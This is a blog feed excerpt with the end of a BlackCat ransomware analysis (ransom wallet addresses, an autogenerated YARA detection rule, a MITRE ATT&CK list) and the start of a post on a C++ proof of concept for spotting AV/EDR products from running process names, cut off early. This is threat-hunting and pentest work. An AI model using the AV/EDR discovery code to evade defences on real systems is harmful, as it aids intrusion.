&lt;p&gt;Bitcoin: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1H3JFbyiwv6YeVW7K2mVjxHgNvJdXqJxiP&lt;/code&gt;   &lt;br /&gt;
Monero: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;46JqTG57Pv6GBRzjM9kHyCF8XHrAo9sr8dLuvqwcGbxT92dUAW12QpgZJnu32KrTfL1BzLp2sBi9G49JyXuRaKmT6JrJL9r&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;yara-rules&quot;&gt;Yara rules&lt;/h3&gt;

&lt;p&gt;Yara rule for BlackCat Ransomware threat hunting:&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;rule win_blackcat_auto {&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;meta&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;author = &quot;Felix Bilstein - yara-signator at cocacoding dot com&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;date = &quot;2023-03-28&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;version = &quot;1&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;description = &quot;Detects win.blackcat.&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;info = &quot;autogenerated rule brought to you by yara-signator&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;tool = &quot;yara-signator v0.6.0&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;signator_config = &quot;callsandjumps;datarefs;binvalue&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_reference = &quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.blackcat&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_rule_date = &quot;20230328&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_hash = &quot;9d2d75cef573c1c2d861f5197df8f563b05a305d&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_version = &quot;20230407&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_license = &quot;CC BY-SA 4.0&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_sharing = &quot;TLP:WHITE&quot;&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;/* DISCLAIMER&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* The strings used in this rule have been automatically selected from the&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* disassembly of memory dumps and unpacked files, using YARA-Signator.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* The code and documentation is published here&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;     *&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/fxb-cocacoding/yara-signator&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* As Malpedia is used as data source, please note that for a given&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* number of families, only single samples are documented.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* This likely impacts the degree of generalization these rules will offer.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* Take the described generation method also into consideration when you&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* apply the rules in your use cases and assign them confidence levels.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;*/&lt;/span&gt;


    &lt;span class=&quot;s&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;$sequence_0 = { c3 81f90a010000 7e6a 81f9e2030000 0f8fcc000000 81f90b010000 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 6, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c3                   | ret&lt;/span&gt;                 
            &lt;span class=&quot;s&quot;&gt;//   81f90a010000         | cmp                 ecx, 0x10a&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   7e6a                 | jle                 0x6c&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   81f9e2030000         | cmp                 ecx, 0x3e2&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   0f8fcc000000         | jg                  0xd2&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   81f90b010000         | cmp                 ecx, 0x10b&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_1 = { 85f6 0f8482000000 bb03000000 8d0437 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   85f6                 | test                esi, esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   0f8482000000         | je                  0x88&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   bb03000000           | mov                 ebx, &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8d0437               | lea                 eax, [edi + esi]&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_2 = { 885405cc 48 eb19 89ca 83fa63 7fbe }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 6, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   885405cc             | mov                 byte ptr [ebp + eax - 0x34], dl&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   48                   | dec                 eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   eb19                 | jmp                 0x1b&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   89ca                 | mov                 edx, ecx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   83fa63               | cmp                 edx, 0x63&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   7fbe                 | jg                  0xffffffc0&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_3 = { f20f104808 8d45d4 894dec c645f004 8d4dec }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   f20f104808           | movsd               xmm1, qword ptr [eax + 8]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8d45d4               | lea                 eax, [ebp - 0x2c]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   894dec               | mov                 dword ptr [ebp - 0x14], ecx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c645f004             | mov                 byte ptr [ebp - 0x10], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8d4dec               | lea                 ecx, [ebp - 0x14]&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_4 = { 3d32210000 747b 3d33210000 0f8571050000 8b07 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   3d32210000           | cmp                 eax, 0x2132&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   747b                 | je                  0x7d&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   3d33210000           | cmp                 eax, 0x2133&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   0f8571050000         | jne                 0x577&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b07                 | mov                 eax, dword ptr [edi]&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_5 = { b005 5e 5d c3 81f90a010000 7e6a 81f9e2030000 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 7, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   b005                 | mov                 al, &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   5e                   | pop                 esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   5d                   | pop                 ebp&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c3                   | ret&lt;/span&gt;                 
            &lt;span class=&quot;s&quot;&gt;//   81f90a010000         | cmp                 ecx, 0x10a&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   7e6a                 | jle                 0x6c&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   81f9e2030000         | cmp                 ecx, 0x3e2&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_6 = { 747b 3d33210000 0f8571050000 8b07 83f00a }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   747b                 | je                  0x7d&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   3d33210000           | cmp                 eax, 0x2133&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   0f8571050000         | jne                 0x577&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b07                 | mov                 eax, dword ptr [edi]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   83f00a               | xor                 eax, 0xa&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_7 = { b806000000 c7460400000000 894608 c70601000000 83c430 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   b806000000           | mov                 eax, &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;6&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c7460400000000       | mov                 dword ptr [esi + 4], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   894608               | mov                 dword ptr [esi + 8], eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c70601000000         | mov                 dword ptr [esi], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   83c430               | add                 esp, 0x30&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_8 = { 89d0 ba3e000000 897e0c f7e2 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   89d0                 | mov                 eax, edx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   ba3e000000           | mov                 edx, 0x3e&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   897e0c               | mov                 dword ptr [esi + 0xc], edi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   f7e2                 | mul                 edx&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_9 = { c6410b00 66c741090000 8b45ec 894110 c7411400000000 b801000000 8901 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 7, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;600&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c6410b00             | mov                 byte ptr [ecx + 0xb], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   66c741090000         | mov                 word ptr [ecx + 9], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b45ec               | mov                 eax, dword ptr [ebp - 0x14]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   894110               | mov                 dword ptr [ecx + 0x10], eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   c7411400000000       | mov                 dword ptr [ecx + 0x14], &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   b801000000           | mov                 eax, &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8901                 | mov                 dword ptr [ecx], eax&lt;/span&gt;

    &lt;span class=&quot;na&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;7 of them and filesize &amp;lt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;29981696&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;mitre-attck&quot;&gt;MITRE ATT&amp;amp;CK&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/techniques/T1027/002/&quot;&gt;T1027.002&lt;/a&gt; - Obfuscated Files or Information: Software Packing    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1027/&quot;&gt;T1027&lt;/a&gt; - Obfuscated Files or Information    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1007/&quot;&gt;T1007&lt;/a&gt; - System Service Discovery  &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1059/&quot;&gt;T1059&lt;/a&gt; - Command and Scripting Interpreter      &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/tactics/TA0010/&quot;&gt;TA0010&lt;/a&gt; - Exfiltration    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1082/&quot;&gt;T1082&lt;/a&gt; - System Information Discovery      &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1490/&quot;&gt;T1490&lt;/a&gt; - Inhibit System Recovery    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1485/&quot;&gt;T1485&lt;/a&gt; - Data Destruction   &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1078/&quot;&gt;T1078&lt;/a&gt; - Valid Accounts       &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1486/&quot;&gt;T1486&lt;/a&gt; - Data Encrypted For Impact    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1140/&quot;&gt;T1140&lt;/a&gt; - Encode/Decode Files or Information    &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1202/&quot;&gt;T1202&lt;/a&gt; - Indirect Command Execution   &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1543/003/&quot;&gt;T1543.003&lt;/a&gt; - Create or Modify System Process: Windows Service     &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1550/002/&quot;&gt;T1550.002&lt;/a&gt; - Use Alternate Authentication Material: Pass The Hash&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/madiyar-mukhamadiyev-306b37239/&quot;&gt;@mgmadr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/software/S1068/&quot;&gt;MITRE ATT&amp;amp;CK: BlackCat&lt;/a&gt;      &lt;br /&gt;
&lt;a href=&quot;https://en.wikipedia.org/wiki/Salsa20&quot;&gt;Salsa20 wikipedia&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://therecord.media/an-alphv-blackcat-representative-discusses-the-groups-plans-for-a-ransomware-meta-universe&quot;&gt;An ALPHV (BlackCat) representative discusses the group’s plans for a ransomware ‘meta-universe’&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.blackcat&quot;&gt;malpedia: BlackCat&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">BlackCat is Rust-based ransomware distributed via the Ransomware-as-a-Service (RaaS) model. BlackCat was observed for the first time in November 2021 and has since been used to target multiple sectors and organizations in numerous countries and regions in Africa, the Americas, Asia, Australia, and Europe.</summary></entry><entry><title type="html">DEFC: simple enumeration tool for detect AV/EDR</title><link href="http://localhost:4001/open-source/2023/07/03/open-source-1.html" rel="alternate" type="text/html" title="DEFC: simple enumeration tool for detect AV/EDR" /><published>2023-07-03T06:00:00+03:00</published><updated>2023-07-03T06:00:00+03:00</updated><id>http://localhost:4001/open-source/2023/07/03/open-source-1</id><content type="html" xml:base="http://localhost:4001/open-source/2023/07/03/open-source-1.html">&lt;p&gt;Hello, cybersecurity enthusiasts and white hackers!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-03_09-10.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This post is the result of our research and the result on the pentest practical cases. We just show the basic Proof of Concept code which detect AV/EDR engine in Windows machine.&lt;/p&gt;

&lt;h3 id=&quot;research&quot;&gt;research&lt;/h3&gt;

&lt;p&gt;First of all, let’s say we have a file with this format:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-csv&quot;&gt;acctmgr.exe|Symantec
AcctMgr.exe|Symantec
ashSimpl.exe|Avast
ashSkPcc.exe|Avastavpcc.exe|Kaspersky
AVPDTAgt.exe|Kaspersky Lab Deployment Tool Agent
avpexec.exe|Kaspersky
avp.exe|Kaspersky
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let’s go to define some struct:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// define a struct to store process name and description&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// array of Process structs, and counter&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And read process list from this file:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// read process data from a file&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readProcListFromFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Could not open file %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// reallocate memory for each new process&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// parse the line, split it into process name and description&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we just check the running processes in the system, for example microsoft provides a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes&quot;&gt;good example&lt;/a&gt; of how to do this.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// enumerate running processes&lt;/span&gt;
